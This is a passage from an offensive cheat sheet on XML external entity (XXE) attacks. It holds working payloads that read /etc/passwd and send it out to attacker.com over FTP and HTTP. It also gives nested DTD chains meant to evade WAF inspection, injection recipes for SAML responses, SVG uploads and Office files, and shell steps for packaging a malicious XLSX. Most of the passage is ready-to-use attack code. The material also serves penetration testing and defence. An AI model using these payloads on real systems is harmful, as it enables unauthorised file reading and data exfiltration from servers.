# xxe-test · part 1（续）

> 接 [`xxe-test-p1.md`](xxe-test-p1.md) 的后半段（原块 >12KB 拆分）。

#### Windows

```
C:\Windows\System32\wbem\xml\cim20.dtd            # WMI
C:\Windows\System32\wbem\xml\wmi20.dtd             # WMI
C:\Program Files\IBM\WebSphere\*.dtd               # WebSphere
C:\Program Files (x86)\Lotus\*.dtd                 # Lotus Notes
```

#### Inside JAR Files (Java Applications)

```
jar:file:///usr/share/java/tomcat-*.jar!/javax/servlet/resources/web-app_2_3.dtd
jar:file:///opt/wildfly/modules/*.jar!/org/jboss/as/*.dtd
file:///usr/share/java/struts2-core-*.jar!/struts-2.5.dtd
```

### Why This Works

- External connections blocked (firewall/WAF/egress filter)
- But file:// to LOCAL files is usually allowed
- Local DTD is trusted → entity overrides inject attacker-controlled definitions
- Error messages or blind extraction via file:// still works

---
## 14. ADDITIONAL OOB EXFILTRATION CHANNELS

### FTP-based exfiltration (line-by-line)

FTP protocol sends data line-by-line, making it useful for multi-line file exfiltration when HTTP-based OOB truncates at newlines:

```xml
<!-- attacker.com/ftp-exfil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com:2121/%file;'>">
%exfil;
%send;
```

Run a rogue FTP server (e.g., `xxeserv` or custom Python) on port 2121 — each line of the file arrives as a separate `RETR` or `CWD` command.

### HTTP parameter exfiltration

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>">
%exfil;
%send;
```

Base64 encoding avoids newline/special-character issues in HTTP URL. Decode the `d=` parameter on attacker server.

---
## 15. DTD NESTING TRICKS — PARAMETER ENTITY CHAINING

### Parameter entity within parameter entity

Used to bypass parsers that block direct entity references in entity values:

```xml
<!DOCTYPE foo [
  <!ENTITY % a "&#x25; b;">
  <!ENTITY % b SYSTEM "http://attacker.com/chain.dtd">
  %a;
]>
```

The parser expands `%a;` → `%b;` → fetches external DTD. Some WAFs only inspect the first level of entity definitions.

### Triple-nested for filter evasion

```xml
<!-- attacker.com/stage1.dtd -->
<!ENTITY % s2 SYSTEM "http://attacker.com/stage2.dtd">
%s2;

<!-- attacker.com/stage2.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % s3 "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%s3;
%exfil;
```

Payload sent to target only references `stage1.dtd` — the actual file read happens two DTD fetches deep, evading shallow WAF inspection.

---
## 16. XXE IN NON-OBVIOUS FORMATS

| Format | XML Location | Injection Point |
|--------|-------------|-----------------|
| **SOAP Envelope** | Entire body is XML | Add DOCTYPE before `<soap:Envelope>` |
| **SVG Image** | SVG is XML | `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in SVG header |
| **OOXML (.docx)** | `word/document.xml`, `[Content_Types].xml` | Inject DOCTYPE + entity into any XML member |
| **OOXML (.xlsx)** | `xl/sharedStrings.xml`, `xl/worksheets/sheet1.xml` | Entity reference in cell values |
| **RSS/Atom feeds** | Feed body is XML | Inject into feed items if user content is included |
| **SAML assertions** | SAML XML tokens | DOCTYPE injection in `SAMLResponse` parameter (base64-decoded XML) |
| **XMPP** | Protocol messages are XML stanzas | Entity in message body or JID fields |
| **GPX files** | GPS track data in XML | Via file upload endpoints accepting GPX |
| **XHTML** | Strict XHTML is valid XML | DOCTYPE injection in XHTML documents |

### SAML XXE

```xml
<!-- Base64-decode the SAMLResponse, inject DOCTYPE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

Re-encode to base64, submit as `SAMLResponse` parameter.

---
## 17. XXE VIA FILE UPLOAD

### SVG upload

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="50" font-size="14">&xxe;</text>
</svg>
```

Upload as avatar/image → view uploaded SVG → file content rendered as text.

### XLSX (Excel) upload

```bash
# 1. Create minimal .xlsx, unzip it
unzip report.xlsx -d xlsx_tmp/

# 2. Inject into xl/sharedStrings.xml
# Add after XML declaration:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Replace a <t> element content with &xxe;

# 3. Repackage
cd xlsx_tmp && zip -r ../malicious.xlsx .
```

Alternatively inject into `[Content_Types].xml` (parsed first by most OOXML processors).

### DOCX upload

```bash
# Target: word/document.xml
# Same approach: unzip → inject DOCTYPE + entity → repackage

# Alternative: inject into customXml/item1.xml if custom XML parts exist
```

### Processing pipeline attack

Even if the uploaded file is not directly rendered, the server-side parser (Apache POI, python-docx, OpenXML SDK) may process entities during import, triggering OOB exfiltration.

---
